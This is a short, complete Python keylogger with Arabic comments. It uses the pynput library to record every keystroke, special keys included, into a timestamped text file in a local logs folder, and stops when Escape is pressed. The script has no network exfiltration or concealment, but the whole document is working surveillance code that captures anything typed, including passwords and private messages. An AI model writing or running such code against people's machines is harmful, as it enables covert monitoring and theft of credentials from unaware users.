import logging
import os
from datetime import datetime
from pynput.keyboard import Key, Listener

# تحديد مسار حفظ السجلات (Log file)
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_file = os.path.join(LOG_DIR, f"keylogger_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}.txt")

def log_key(key):
    """تسجيل كل مفتاض يتم ضغطه"""
    try:
        char = str(key.char)
    except AttributeError:
        # التعامل مع المفاتيض الخاصة مثل Ctrl, Alt, Enter
        char = f" [{str(key)}] "
    
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(char)

def on_press(key):
    log_key(key)

def on_release(key):
    if key == Key.esc:
        return False  # إيقاف المستمع عند الضغط على Escape

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
